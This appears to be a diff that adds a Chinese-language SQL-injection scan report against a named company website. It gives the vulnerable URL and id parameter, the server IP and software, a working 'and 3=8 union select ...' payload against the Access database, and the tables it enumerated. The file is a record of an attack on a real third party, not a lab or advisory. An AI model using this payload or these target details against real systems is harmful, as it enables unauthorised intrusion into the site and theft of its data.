@@ -1,0 +1,27 @@
+■漏洞信息:============================================================
+ ·URL:http://www.cnshilin.com/nDetails.asp?id=373
+ ·页面标题：永康市世林电器厂
+ ·参数:id=373
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:174.139.83.235
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 11 Sep 2011 03:37:34 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 33980
+Content-Type: text/html
+Cache-control: private
+
+
+联合查询列数: 总共= 10  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6,7,8,9,10 from MSysAccessObjects
+找到表:news
+找到表:article
+找到表:contact
+找到表:News
